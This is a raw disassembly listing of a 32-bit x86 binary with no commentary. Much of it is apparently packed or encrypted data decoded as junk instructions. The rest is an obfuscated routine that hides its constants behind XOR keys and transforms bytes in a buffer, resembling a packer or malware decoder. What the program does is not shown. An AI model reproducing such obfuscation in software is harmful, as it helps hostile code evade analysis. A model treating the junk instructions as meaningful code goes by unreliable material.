  40c4b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4b8:	mov    ecx,ds
  40c4ba:	jmp    0x40c527
  40c4bc:	mov    eax,ds:0x5b6b2625
  40c4c1:	inc    ecx
  40c4c2:	sar    BYTE PTR [ebx+eiz*4+0x3422d79d],1
  40c4c9:	retf   0x47cb
  40c4cc:	sub    DWORD PTR [edx],esp
  40c4ce:	lea    ebx,ds:0x4a33c11a
  40c4d4:	adc    DWORD PTR [eax],ebx
  40c4d6:	cmp    ecx,ebx
  40c4d8:	xor    ch,al
  40c4da:	lods   al,BYTE PTR ds:[esi]
  40c4db:	add    bh,BYTE PTR [edx-0x12df50ca]
  40c4e1:	xchg   ebx,eax
  40c4e2:	mov    ds:0xe4b53d29,eax
  40c4e7:	xchg   esi,eax
  40c4e8:	data16 fistp WORD PTR cs:[ebx]
  40c4ec:	(bad)  
  40c4ed:	pop    ebx
  40c4ee:	repnz inc ebp
  40c4f0:	dec    edi
  40c4f1:	hlt    
  40c4f2:	dec    edx
  40c4f3:	(bad)  
  40c4f4:	sub    dh,al
  40c4f6:	or     bl,dh
  40c4f8:	push   es
  40c4f9:	jns    0x40c571
  40c4fb:	loopne 0x40c50b
  40c4fd:	cmc    
  40c4fe:	add    eax,0x9fcfd552
  40c503:	(bad)  
  40c504:	mov    ds:0x1916e929,eax
  40c509:	or     eax,0x881a10e9
  40c50e:	dec    ebx
  40c50f:	hlt    
  40c510:	xchg   esp,eax
  40c511:	or     dh,dh
  40c513:	gs test al,0x83
  40c516:	cmp    eax,0x8b6c7fb8
  40c51b:	jno    0x40c4bc
  40c51d:	mov    bl,0xf4
  40c51f:	and    al,0x93
  40c521:	add    eax,0x4e29b577
  40c526:	push   edx
  40c527:	fiadd  DWORD PTR [esi]
  40c529:	inc    esi
  40c52a:	pop    es
  40c52b:	sbb    esi,DWORD PTR [esi+0x2ee4497a]
  40c531:	int    0x60
  40c533:	lods   al,BYTE PTR ds:[esi]
  40c534:	mov    edx,0x6c98b7af
  40c539:	or     DWORD PTR [esi-0x6c],edx
  40c53c:	fnsave [edx+0x539c4d3f]
  40c542:	rcr    ebp,0x12
  40c545:	jg     0x40c4d6
  40c547:	lds    ecx,FWORD PTR [ebp+0x2c]
  40c54a:	(bad)  
  40c54b:	call   0xd1c9b89b
  40c550:	in     eax,dx
  40c551:	sub    al,0x58
  40c553:	add    BYTE PTR [ecx-0x310dba0a],bl
  40c559:	lods   eax,DWORD PTR ds:[esi]
  40c55a:	inc    ebp
  40c55b:	sub    eax,DWORD PTR [ecx-0x72ade45f]
  40c561:	mov    ebx,0xa9d7d01b
  40c566:	dec    ebp
  40c567:	jecxz  0x40c590
  40c569:	add    bl,BYTE PTR [ebx+0x5d3135f1]
  40c56f:	dec    eax
  40c570:	lods   al,BYTE PTR ds:[esi]
  40c571:	adc    eax,0xe0145b0d
  40c576:	add    al,0x25
  40c578:	les    eax,FWORD PTR [ecx]
  40c57a:	rcl    ebp,1
  40c57c:	out    dx,eax
  40c57d:	je     0x40c5f9
  40c57f:	das    
  40c580:	daa    
  40c581:	and    BYTE PTR [ebp+edx*2+0x44],0x87
  40c586:	jp     0x40c512
  40c588:	mov    WORD PTR [ebp+0x1f],?
  40c58b:	jecxz  0x40c59a
  40c58d:	pop    ebp
  40c58e:	int3   
  40c58f:	and    al,0x39
  40c591:	jmp    0x40c58b
  40c593:	es add edx,esp
  40c596:	dec    esp
  40c597:	test   eax,0xbe804a2e
  40c59c:	push   ds
  40c59d:	xor    al,0x88
  40c59f:	mov    edx,0xc9624c86
  40c5a4:	shr    DWORD PTR [esp+ebx*1+0x65084359],1
  40c5ab:	xchg   ecx,eax
  40c5ac:	xchg   BYTE PTR [eax],ch
  40c5ae:	xor    eax,0x6847d9e6
  40c5b3:	rcl    DWORD PTR [edx+0x10],1
  40c5b6:	xchg   edi,eax
  40c5b7:	mov    ds:0xc06073d0,eax
  40c5bc:	push   cs
  40c5bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5be:	add    dh,cl
  40c5c0:	sahf   
  40c5c1:	sbb    al,0xf7
  40c5c3:	nop
  40c5c4:	jb     0x40c5e7
  40c5c6:	xchg   edx,eax
  40c5c7:	pop    ss
  40c5c8:	out    dx,al
  40c5c9:	add    eax,DWORD PTR [edi]
  40c5cb:	test   al,dl
  40c5cd:	adc    DWORD PTR [eax-0x51456e01],eax
  40c5d3:	fwait
  40c5d4:	xchg   esi,eax
  40c5d5:	int3   
  40c5d6:	fs pop eax
  40c5d8:	ret    
  40c5d9:	push   es
  40c5da:	or     al,0x8d
  40c5dc:	dec    esp
  40c5dd:	loope  0x40c63f
  40c5df:	cmp    DWORD PTR [ebp-0x5376e547],esp
  40c5e5:	xor    eax,0xdfe30dbe
  40c5ea:	jnp    0x40c651
  40c5ec:	bound  esp,QWORD PTR [eax+ecx*8+0x3b]
  40c5f0:	aad    0x8a
  40c5f2:	and    BYTE PTR [ebx+0x14],0x1d
  40c5f6:	loop   0x40c5d2
  40c5f8:	sub    edi,edx
  40c5fa:	add    DWORD PTR [ecx+0x6c],ecx
  40c5fd:	icebp  
  40c5fe:	adc    DWORD PTR [esi-0x1aa201d6],esi
  40c604:	inc    ebx
  40c605:	(bad)  
  40c606:	pop    ecx
  40c607:	adc    bh,bh
  40c609:	(bad)  
  40c60a:	mov    edi,0xb683c552
  40c60f:	js     0x40c63c
  40c611:	test   al,0xf
  40c613:	mov    eax,?
  40c615:	cmp    BYTE PTR [esi],al
  40c617:	mov    al,ds:0x65d336f2
  40c61c:	push   cs
  40c61d:	cdq    
  40c61e:	mov    ch,0xfa
  40c620:	pop    ebx
  40c621:	pop    ebx
  40c622:	fidivr DWORD PTR ds:0x1f7b7586
  40c628:	test   al,0xb9
  40c62a:	je     0x40c630
  40c62c:	add    eax,0xf75cb4fe
  40c631:	fs cmp al,0x1d
  40c634:	cli    
  40c635:	xchg   edx,eax
  40c636:	dec    eax
  40c637:	sub    DWORD PTR [edi-0x5787d2],0xe38c7874
  40c641:	inc    edi
  40c642:	stos   BYTE PTR es:[edi],al
  40c643:	cld    
  40c644:	add    eax,ebp
  40c646:	jo     0x40c64c
  40c648:	adc    eax,0x4f541f51
  40c64d:	cmp    BYTE PTR [ebp+0x69],bh
  40c650:	xchg   edx,eax
  40c651:	out    0x94,eax
  40c653:	das    
  40c654:	push   ds
  40c655:	les    ebp,FWORD PTR [esi+0x4b819326]
  40c65b:	sar    BYTE PTR [esi+0x43cedfbd],1
  40c661:	push   edx
  40c662:	rcl    ah,1
  40c664:	test   eax,0xd7ca82f7
  40c669:	xor    ah,cl
  40c66b:	cld    
  40c66c:	inc    ax
  40c66e:	mov    eax,?
  40c670:	sub    BYTE PTR [ebx+eax*8-0x2a],bl
  40c674:	and    bl,BYTE PTR [ecx+0x62d4a0f8]
  40c67a:	add    bl,0x7b
  40c67d:	push   0x5be737e0
  40c682:	test   BYTE PTR [ebp+edx*8+0x66924e0a],ch
  40c689:	jno    0x40c6bf
  40c68b:	sbb    BYTE PTR [ecx+0x6e21e187],al
  40c691:	(bad)  
  40c692:	leave  
  40c693:	in     eax,0x1c
  40c695:	into   
  40c696:	jg     0x40c6cd
  40c698:	mov    ah,BYTE PTR ds:0xd8b26064
  40c69e:	cmp    eax,ebx
  40c6a0:	fistp  WORD PTR [edx]
  40c6a2:	push   0xffffffce
  40c6a4:	adc    bh,BYTE PTR [edi-0x25]
  40c6a7:	fbstp  TBYTE PTR [eax+0x13]
  40c6aa:	(bad)  
  40c6ab:	fld    TBYTE PTR [edi-0x33b8026e]
  40c6b1:	int    0xb5
  40c6b3:	push   ss
  40c6b4:	fdivr  QWORD PTR [edx]
  40c6b6:	pop    ebp
  40c6b7:	test   ch,0xe8
  40c6ba:	adc    eax,0xb046c2f7
  40c6bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6c0:	adc    ch,BYTE PTR cs:[esi+0x1c86bad6]
  40c6c7:	push   cs
  40c6c8:	out    0x41,eax
  40c6ca:	ja     0x40c724
  40c6cc:	push   0x25
  40c6ce:	jmp    0xfe2b3120
  40c6d3:	add    al,0xc6
  40c6d5:	jg     0x40c70d
  40c6d7:	pop    ebx
  40c6d8:	xor    ah,BYTE PTR ds:0x4b914386
  40c6de:	jp     0x40c675
  40c6e0:	test   DWORD PTR [edi],esp
  40c6e2:	rol    BYTE PTR ds:0x41dfdd9c,0xec
  40c6e9:	add    ah,BYTE PTR [esi-0x36a821c2]
  40c6ef:	fstp   DWORD PTR [edi+0x34cc9963]
  40c6f5:	xor    al,cl
  40c6f7:	fsub   QWORD PTR [esi]
  40c6f9:	test   BYTE PTR [edi+0x6349797],cl
  40c6ff:	test   BYTE PTR [ecx],cl
  40c701:	mov    ch,0x38
  40c703:	outs   dx,DWORD PTR ds:[esi]
  40c704:	out    0xef,eax
  40c706:	in     eax,dx
  40c707:	sub    BYTE PTR [edx+0x74],0xfe
  40c70b:	imul   ecx,edx,0xf6fcfba4
  40c711:	ds in  eax,0x28
  40c714:	call   0xcefd:0x81a89026
  40c71b:	mov    ebp,0xe8a4f512
  40c720:	lea    ecx,[edx]
  40c722:	xlat   BYTE PTR ds:[ebx]
  40c723:	push   esp
  40c724:	mov    eax,0x668d9411
  40c729:	or     DWORD PTR [ebp+0x2e],0x5232d84c
  40c730:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40c732:	mov    dl,0xae
  40c734:	fwait
  40c735:	push   ds
  40c736:	and    eax,DWORD PTR [edx-0x7c]
  40c739:	out    dx,al
  40c73a:	cld    
  40c73b:	in     eax,dx
  40c73c:	push   0x6824ec83
  40c741:	mov    eax,ds:0x9be7a3dc
  40c746:	push   cs
  40c747:	sub    al,0xe3
  40c749:	les    ebp,FWORD PTR [esi-0x139c986d]
  40c74f:	ret    0x3d01
  40c752:	repz sub ebx,0x353e3e94
  40c759:	jecxz  0x40c741
  40c75b:	stc    
  40c75c:	sbb    al,0xa9
  40c75e:	mov    al,0xbe
  40c760:	mov    ?,WORD PTR [ecx]
  40c762:	inc    ebp
  40c763:	dec    eax
  40c764:	inc    edx
  40c765:	sub    DWORD PTR [esi+0x4100d0c6],esi
  40c76b:	(bad)  
  40c76d:	xor    ch,BYTE PTR [ebx]
  40c76f:	mov    ds:0x7365a3cf,al
  40c774:	(bad)  
  40c775:	cmp    BYTE PTR [ebp-0x74],ch
  40c778:	in     al,dx
  40c779:	push   ds
  40c77a:	mov    edi,0x681c9fc7
  40c77f:	xchg   ecx,eax
  40c780:	ret    
  40c781:	push   ecx
  40c782:	jb     0x40c7ba
  40c784:	and    al,0x44
  40c786:	stos   DWORD PTR es:[edi],eax
  40c787:	fimul  WORD PTR [ebx-0x70]
  40c78a:	scas   al,BYTE PTR es:[edi]
  40c78b:	inc    ebx
  40c78c:	cs pop ebp
  40c78e:	xchg   esi,eax
  40c78f:	mov    dl,BYTE PTR [edi-0x3d]
  40c792:	inc    ecx
  40c793:	cmp    DWORD PTR [esi],esp
  40c795:	(bad)  
  40c798:	sub    al,0x13
  40c79a:	aas    
  40c79b:	ret    
  40c79c:	ret    
  40c79d:	mov    dh,0x10
  40c79f:	pop    ss
  40c7a0:	aad    0x1b
  40c7a2:	lods   eax,DWORD PTR ds:[esi]
  40c7a3:	and    esp,eax
  40c7a5:	mov    edi,0xc3b75e5d
  40c7aa:	adc    al,0x14
  40c7ac:	mov    BYTE PTR [esi+0x1f],dh
  40c7af:	icebp  
  40c7b0:	xchg   bp,ax
  40c7b2:	xor    edi,DWORD PTR ds:[ebx]
  40c7b5:	es sub eax,0x12097318
  40c7bb:	dec    esi
  40c7bc:	cmc    
  40c7bd:	jne    0x40c7be
  40c7bf:	(bad)  
  40c7c0:	sbb    BYTE PTR [esi-0x7fae27ca],bl
  40c7c6:	popf   
  40c7c7:	sub    al,0x59
  40c7c9:	fmul   QWORD PTR [edx]
  40c7cb:	add    al,0x57
  40c7cd:	sub    al,0x31
  40c7cf:	ins    BYTE PTR es:[edi],dx
  40c7d0:	push   ecx
  40c7d1:	jns    0x40c84d
  40c7d3:	and    edi,DWORD PTR cs:[ebp-0x9]
  40c7d7:	jnp    0x40c81f
  40c7d9:	test   DWORD PTR [eax-0x40b8255b],esi
  40c7df:	ret    
  40c7e0:	(bad)  
  40c7e1:	xor    BYTE PTR [edx+0x7c084346],0xb5
  40c7e8:	and    al,0x74
  40c7ea:	add    dl,bl
  40c7ec:	sub    edx,eax
  40c7ee:	and    edx,DWORD PTR [ecx-0x7bd6e4ca]
  40c7f4:	aas    
  40c7f5:	shl    BYTE PTR ds:0xb4901fab,1
  40c7fb:	int    0x5e
  40c7fd:	sub    bl,BYTE PTR [edx]
  40c7ff:	jle    0x40c870
  40c801:	(bad)  [eax-0x61022928]
  40c807:	inc    esp
  40c808:	push   esp
  40c809:	inc    edx
  40c80a:	push   edx
  40c80b:	add    eax,0x90b2879e
  40c810:	(bad)
  40c813:	js     0x40c7fc
  40c815:	and    BYTE PTR [ebx+eax*2+0x1e4b2362],dh
  40c81c:	dec    esp
  40c81d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c81e:	ins    DWORD PTR es:[edi],dx
  40c81f:	leave  
  40c820:	out    0x97,eax
  40c822:	stos   BYTE PTR es:[edi],al
  40c823:	repz pop esp
  40c825:	xchg   ecx,eax
  40c826:	add    al,0x5a
  40c828:	mov    ebx,0xc026ff51
  40c82d:	pop    edx
  40c82e:	mov    ds:0x2795866f,al
  40c833:	ins    DWORD PTR es:[edi],dx
  40c834:	mov    bx,0x6e18
  40c838:	test   dl,dh
  40c83a:	into   
  40c83b:	adc    BYTE PTR [esi+edi*4],ah
  40c83e:	adc    BYTE PTR cs:[ebx+0x9],bh
  40c842:	mov    eax,0xd5fe5b6c
  40c847:	lock data16 jg 0x40c84c
  40c84b:	push   esi
  40c84c:	std    
  40c84d:	ret    0x9595
  40c850:	dec    eax
  40c851:	(bad)  
  40c853:	jmp    0x5624cdce
  40c858:	(bad)  
  40c859:	xchg   esp,eax
  40c85a:	int3   
  40c85b:	xchg   ebp,eax
  40c85c:	ror    ebp,1
  40c85e:	mov    fs,WORD PTR [ebp-0x36]
  40c861:	ja     0x40c880
  40c863:	pop    ds
  40c864:	jmp    0x3ffedafa
  40c869:	xor    BYTE PTR [edx+ebp*1-0x1d36b1b6],bl
  40c870:	ja     0x40c872
  40c872:	and    BYTE PTR [esi-0x6c4e26af],dl
  40c878:	mov    dh,0xed
  40c87a:	mov    ch,0x74
  40c87c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c87d:	mov    dl,0xeb
  40c87f:	sahf   
  40c880:	enter  0x6894,0xec
  40c884:	or     DWORD PTR [edx],esi
  40c886:	fwait
  40c887:	or     eax,DWORD PTR [edi-0x79a81ae6]
  40c88d:	rcl    DWORD PTR [edi-0x2500afca],1
  40c893:	sbb    al,0xf6
  40c895:	add    al,BYTE PTR [edi-0x7c1b8a10]
  40c89b:	mov    edx,esp
  40c89d:	mov    ecx,0x65c358f8
  40c8a2:	add    eax,0x63ae6687
  40c8a7:	cmp    DWORD PTR [eax-0x7],0xd
  40c8ab:	das    
  40c8ac:	mov    edx,tr1
  40c8af:	nop
  40c8b0:	in     eax,dx
  40c8b1:	dec    eax
  40c8b2:	jb     0x40c8cc
  40c8b4:	and    DWORD PTR [ebx+0x73],ebx
  40c8b7:	push   edx
  40c8b8:	sub    edi,edx
  40c8ba:	mov    DWORD PTR [edi],esi
  40c8bc:	lods   eax,DWORD PTR ds:[esi]
  40c8bd:	pop    ss
  40c8be:	push   0x6fa7e906
  40c8c3:	push   ds
  40c8c4:	sahf   
  40c8c5:	xchg   edi,eax
  40c8c7:	dec    ebx
  40c8c8:	sub    DWORD PTR [eax-0x28],edi
  40c8cb:	mov    ebp,0x524bc731
  40c8d0:	adc    eax,0x24270a1b
  40c8d5:	xchg   edi,eax
  40c8d6:	adc    al,BYTE PTR [edi-0x2a9119b1]
  40c8dc:	jne    0x40c8eb
  40c8de:	mov    dh,0x7d
  40c8e0:	mov    ebx,0x1587396f
  40c8e5:	xor    BYTE PTR [esi+esi*2+0x60b20575],dh
  40c8ec:	out    0x1c,eax
  40c8ee:	push   esi
  40c8ef:	cdq    
  40c8f0:	and    al,0x54
  40c8f2:	or     BYTE PTR [edx],cl
  40c8f4:	push   cs
  40c8f5:	pushf  
  40c8f6:	in     al,dx
  40c8f7:	in     eax,0x37
  40c8f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8fa:	into   
  40c8fb:	hlt    
  40c8fc:	mov    eax,ds:0x3939f1b4
  40c901:	iret   
  40c902:	sahf   
  40c903:	repz cmp edx,DWORD PTR [eax+0xc]
  40c907:	push   ds
  40c908:	call   0xc36a7d3b
  40c90d:	aam    0xd4
  40c90f:	sbb    ecx,ecx
  40c911:	mov    bh,0x9a
  40c913:	mov    al,0x46
  40c915:	push   ss
  40c916:	dec    eax
  40c917:	mov    BYTE PTR [ecx+0x13beabcd],ch
  40c91d:	hlt    
  40c91e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c91f:	and    BYTE PTR [edi+0x7f],bl
  40c922:	xor    edx,ecx
  40c924:	xor    eax,0xc67d7276
  40c929:	(bad)  
  40c92a:	mov    esi,0xc6a55fdd
  40c92f:	and    ebx,0xffffff88
  40c932:	call   0x747eff2c
  40c937:	(bad)  
  40c938:	in     al,0x1c
  40c93a:	jecxz  0x40c95f
  40c93c:	mov    ch,BYTE PTR [ebx]
  40c93e:	sub    DWORD PTR [ebp+0x3dabeaec],edi
  40c944:	fidiv  WORD PTR [esi]
  40c946:	sub    al,0xd0
  40c948:	add    BYTE PTR fs:[edx-0x4b2abce2],bl
  40c94f:	adc    DWORD PTR [eax+ebp*8-0x6e],ebx
  40c953:	xor    eax,0x798494d1
  40c958:	xchg   esi,eax
  40c959:	dec    ecx
  40c95a:	xor    esp,DWORD PTR [ebp+0x7c93be01]
  40c960:	add    DWORD PTR [edi],esp
  40c962:	cmp    edx,esp
  40c964:	push   ecx
  40c965:	cwde   
  40c966:	xor    bh,0x72
  40c969:	or     DWORD PTR [eax-0x30cc156c],ebp
  40c96f:	pop    ss
  40c970:	sahf   
  40c971:	fdivr  st,st(6)
  40c973:	sub    eax,DWORD PTR [eax+esi*4]
  40c976:	and    esi,esp
  40c978:	outs   dx,DWORD PTR ds:[esi]
  40c979:	adc    al,0xd5
  40c97b:	retf   
  40c97c:	xchg   BYTE PTR [edi],ah
  40c97e:	jae    0x40c905
  40c980:	ins    DWORD PTR es:[edi],dx
  40c981:	jle    0x40c91a
  40c983:	push   0xffffffea
  40c985:	pushf  
  40c986:	xchg   ebp,eax
  40c987:	mov    cl,0xca
  40c989:	fisubr DWORD PTR [ebx-0x150edbb0]
  40c98f:	daa    
  40c990:	int    0xb8
  40c992:	or     BYTE PTR [eax],dh
  40c994:	add    al,0x7e
  40c996:	int3   
  40c997:	ins    DWORD PTR es:[edi],dx
  40c998:	and    dh,BYTE PTR [edx]
  40c99a:	out    dx,al
  40c99b:	jle    0x40c93e
  40c99d:	gs push eax
  40c99f:	jae    0x40c937
  40c9a1:	xchg   DWORD PTR [ecx],edx
  40c9a3:	ja     0x40c927
  40c9a5:	push   cs
  40c9a6:	mov    al,0xa4
  40c9a8:	daa    
  40c9a9:	add    DWORD PTR [ecx-0x2e],ebx
  40c9ac:	cdq    
  40c9ad:	pusha  
  40c9ae:	rol    DWORD PTR [eax+ebx*4+0x42],1
  40c9b2:	sbb    eax,0x89336dd2
  40c9b7:	int    0xd7
  40c9b9:	fs mov esp,0x6c8c833e
  40c9bf:	cli    
  40c9c0:	loopne 0x40c9b5
  40c9c2:	and    ah,BYTE PTR ds:0x72998820
  40c9c8:	xchg   ebp,eax
  40c9c9:	cli    
  40c9ca:	inc    eax
  40c9cb:	repnz mov al,ds:0x509c045d
  40c9d1:	xor    BYTE PTR [ecx],al
  40c9d3:	sbb    eax,0x8104a806
  40c9d8:	push   ss
  40c9d9:	mov    dh,0x2d
  40c9db:	inc    edi
  40c9dc:	pop    es
  40c9dd:	fcomp  DWORD PTR [eax-0x415d0cc0]
  40c9e3:	pop    es
  40c9e4:	xor    esi,ebx
  40c9e6:	outs   dx,BYTE PTR ds:[esi]
  40c9e7:	sbb    DWORD PTR [esi+0x52],esp
  40c9ea:	mov    ds:0x9f2668e7,eax
  40c9ef:	xlat   BYTE PTR ds:[ebx]
  40c9f0:	out    dx,al
  40c9f1:	mov    edx,ecx
  40c9f3:	arpl   WORD PTR [esi-0x44],di
  40c9f6:	mov    ah,0x5c
  40c9f8:	push   ebx
  40c9f9:	push   edi
  40c9fa:	mov    eax,0xc22d58a8
  40c9ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca00:	lods   eax,DWORD PTR ds:[esi]
  40ca01:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca03:	fdivp  st(5),st
  40ca05:	fcmovb st,st(1)
  40ca07:	inc    edx
  40ca08:	sti    
  40ca09:	add    BYTE PTR [ecx+0x78],ch
  40ca0c:	rol    DWORD PTR [edi+0x3f],cl
  40ca0f:	shl    DWORD PTR [edx+0x69],0x2
  40ca13:	(bad)  
  40ca15:	shl    BYTE PTR [edx+0x47],1
  40ca18:	bound  ebp,QWORD PTR [ebp+0x504c30ab]
  40ca1e:	xchg   edi,eax
  40ca1f:	outs   dx,DWORD PTR ds:[esi]
  40ca20:	push   0x22
  40ca22:	sti    
  40ca23:	xor    eax,esi
  40ca25:	add    eax,edi
  40ca27:	cmp    edx,eax
  40ca29:	je     0x40cb90
  40ca2f:	mov    eax,DWORD PTR [ebp-0x8]
  40ca32:	mov    DWORD PTR [ebp-0x18],eax
  40ca35:	mov    eax,DWORD PTR [ebp-0x10]
  40ca38:	add    eax,DWORD PTR [ebp-0x54]
  40ca3b:	mov    DWORD PTR [ebp-0x1c],0xf89c85b0
  40ca42:	mov    DWORD PTR [ebp-0x8],eax
  40ca45:	mov    eax,0xf89c85b1
  40ca4a:	mov    DWORD PTR [ebp-0x28],eax
  40ca4d:	mov    DWORD PTR [ebp-0x5c],0xf89c85b2
  40ca54:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  40ca5b:	mov    DWORD PTR [ebp-0x30],eax
  40ca5e:	mov    eax,DWORD PTR [ebp-0x1c]
  40ca61:	xor    eax,esi
  40ca63:	add    eax,edi
  40ca65:	jmp    0x40cb4c
  40ca6a:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  40ca71:	mov    DWORD PTR [ebp-0x50],0xf89c858e
  40ca78:	mov    eax,DWORD PTR [ebp-0x30]
  40ca7b:	mov    edx,DWORD PTR [ebp-0xc]
  40ca7e:	xor    eax,esi
  40ca80:	add    eax,edi
  40ca82:	imul   eax,edx
  40ca85:	mov    edx,DWORD PTR [ebp-0x8]
  40ca88:	mov    al,BYTE PTR [eax+edx*1]
  40ca8b:	mov    BYTE PTR [ebp-0x1],al
  40ca8e:	mov    eax,DWORD PTR [ebp-0x30]
  40ca91:	mov    edx,DWORD PTR [ebp-0xc]
  40ca94:	xor    eax,esi
  40ca96:	add    eax,edi
  40ca98:	imul   eax,edx
  40ca9b:	mov    edx,DWORD PTR [ebp-0x5c]
  40ca9e:	xor    edx,esi
  40caa0:	add    eax,edx
  40caa2:	mov    edx,DWORD PTR [ebp-0x8]
  40caa5:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40caad:	mov    edx,DWORD PTR [ebp-0x4c]
  40cab0:	xor    edx,esi
  40cab2:	lea    eax,[edx+eax*1+0x3272ec]
  40cab9:	movzx  edx,BYTE PTR [ebp-0x1]
  40cabd:	xor    edx,eax
  40cabf:	mov    BYTE PTR [ebp-0x1],dl
  40cac2:	mov    al,BYTE PTR [ebp-0x1]
  40cac5:	mov    edx,DWORD PTR [ebp-0x30]
  40cac8:	mov    ebx,DWORD PTR [ebp-0xc]
  40cacb:	xor    edx,esi
  40cacd:	add    edx,edi
  40cacf:	imul   edx,ebx
  40cad2:	mov    ebx,DWORD PTR [ebp-0x8]
  40cad5:	mov    BYTE PTR [edx+ebx*1],al
  40cad8:	mov    eax,DWORD PTR [ebp-0x30]
  40cadb:	mov    edx,DWORD PTR [ebp-0xc]
  40cade:	xor    eax,esi
  40cae0:	add    eax,edi
  40cae2:	imul   eax,edx
  40cae5:	mov    edx,DWORD PTR [ebp-0x8]
  40cae8:	mov    al,BYTE PTR [eax+edx*1]
  40caeb:	mov    BYTE PTR [ebp-0x1],al
  40caee:	mov    eax,DWORD PTR [ebp-0x30]
  40caf1:	mov    edx,DWORD PTR [ebp-0xc]
  40caf4:	xor    eax,esi
  40caf6:	add    eax,edi
  40caf8:	imul   eax,edx
  40cafb:	mov    edx,DWORD PTR [ebp-0x28]
  40cafe:	xor    edx,esi
  40cb00:	add    eax,edx
  40cb02:	mov    edx,DWORD PTR [ebp-0x8]
  40cb05:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40cb0d:	mov    edx,DWORD PTR [ebp-0x50]
  40cb10:	xor    edx,esi
  40cb12:	lea    eax,[edx+eax*1+0x3272ec]
  40cb19:	movzx  edx,BYTE PTR [ebp-0x1]
  40cb1d:	xor    edx,eax
  40cb1f:	mov    BYTE PTR [ebp-0x1],dl
  40cb22:	mov    al,BYTE PTR [ebp-0x1]
  40cb25:	mov    edx,DWORD PTR [ebp-0x30]
  40cb28:	mov    ebx,DWORD PTR [ebp-0xc]
  40cb2b:	xor    edx,esi
  40cb2d:	add    edx,edi
  40cb2f:	imul   edx,ebx
  40cb32:	mov    ebx,DWORD PTR [ebp-0x8]
  40cb35:	mov    BYTE PTR [edx+ebx*1],al
  40cb38:	mov    eax,DWORD PTR [ebp-0x40]
  40cb3b:	mov    edx,DWORD PTR [ebp-0x28]
  40cb3e:	xor    eax,esi
  40cb40:	xor    edx,esi
  40cb42:	add    eax,edi
  40cb44:	add    edx,edi
  40cb46:	imul   eax,edx
  40cb49:	add    eax,DWORD PTR [ebp-0xc]
  40cb4c:	mov    DWORD PTR [ebp-0xc],eax
  40cb4f:	mov    eax,DWORD PTR [ebp-0xc]
  40cb52:	mov    edx,DWORD PTR [ebp-0x18]
  40cb55:	cmp    edx,eax
  40cb57:	jb     0x40ca6a
  40cb5d:	mov    eax,DWORD PTR [ebp-0x28]
  40cb60:	mov    edx,DWORD PTR [ebp-0x18]
  40cb63:	xor    eax,esi
  40cb65:	add    eax,edi
  40cb67:	imul   eax,edx
  40cb6a:	mov    edx,DWORD PTR [ebp-0x1c]
  40cb6d:	xor    edx,esi
  40cb6f:	add    edx,edi
  40cb71:	or     eax,edx
  40cb73:	mov    edx,DWORD PTR [ebp-0x20]
  40cb76:	xor    edx,esi
  40cb78:	add    eax,edx
  40cb7a:	mov    edx,DWORD PTR [ebp-0x20]
  40cb7d:	xor    edx,esi
  40cb7f:	add    eax,edx
  40cb81:	mov    edx,DWORD PTR [ebp-0x10]
  40cb84:	lea    eax,[eax+edx*1+0x64e5d8]
  40cb8b:	jmp    0x40cb9f
  40cb90:	mov    eax,DWORD PTR [ebp-0x20]
  40cb93:	mov    edx,DWORD PTR [ebp-0x10]
  40cb96:	xor    eax,esi
  40cb98:	lea    eax,[eax+edx*1+0x3272ec]
  40cb9f:	mov    DWORD PTR [ebp-0x10],eax
  40cba2:	jmp    0x4082ff
  40cba7:	mov    ebx,DWORD PTR [ebp-0x3c]
  40cbaa:	mov    eax,DWORD PTR [ebp+0xc]
  40cbad:	xor    eax,esi
  40cbaf:	lea    ecx,[ecx+eax*1+0x3272ec]
  40cbb6:	lea    eax,[ecx-0x3272ec]
  40cbbc:	xor    eax,esi
  40cbbe:	cmp    eax,0xf89c95b0
  40cbc3:	jne    0x405f47
  40cbc9:	dec    DWORD PTR [ebp-0x34]
  40cbcc:	jne    0x405f3b
  40cbd2:	mov    eax,DWORD PTR [ebp+0x8]
  40cbd5:	mov    ecx,DWORD PTR [ebp+0xc]
  40cbd8:	mov    edx,DWORD PTR [ebp+0x8]
  40cbdb:	xor    ecx,esi
  40cbdd:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272ec]
  40cbe4:	xor    eax,esi
  40cbe6:	mov    al,BYTE PTR [eax+ebx*1+0x3272ec]
  40cbed:	xor    edx,esi
  40cbef:	mov    BYTE PTR [edx+ebx*1+0x3272ec],cl
  40cbf6:	mov    ecx,DWORD PTR [ebp+0xc]
  40cbf9:	xor    ecx,esi
  40cbfb:	mov    BYTE PTR [ecx+ebx*1+0x3272ec],al
  40cc02:	mov    eax,DWORD PTR [ebp+0xc]
  40cc05:	xor    eax,esi
  40cc07:	add    eax,edi
  40cc09:	pop    edi
  40cc0a:	pop    esi
  40cc0b:	pop    ebx
  40cc0c:	leave  
  40cc0d:	ret    0x8
  40cc10:	xor    eax,eax
  40cc12:	inc    eax
  40cc13:	ret    
  40cc14:	push   ebp
  40cc15:	mov    ebp,esp
  40cc17:	sub    esp,0x38
  40cc1a:	mov    eax,ds:0x42d01c
  40cc1f:	sbb    DWORD PTR ds:0x42c014,eax
  40cc25:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  40cc2c:	add    eax,DWORD PTR ds:0x429018
  40cc32:	push   ebx
  40cc33:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  40cc3a:	xor    DWORD PTR ds:0x42a014,ebx
  40cc40:	mov    eax,DWORD PTR [ebp-0x4]
  40cc43:	push   esi
  40cc44:	mov    esi,DWORD PTR ds:0x429020
  40cc4a:	or     esi,DWORD PTR ds:0x42d01c
  40cc50:	mov    DWORD PTR ds:0x429020,esi
  40cc56:	mov    esi,0x75108a4
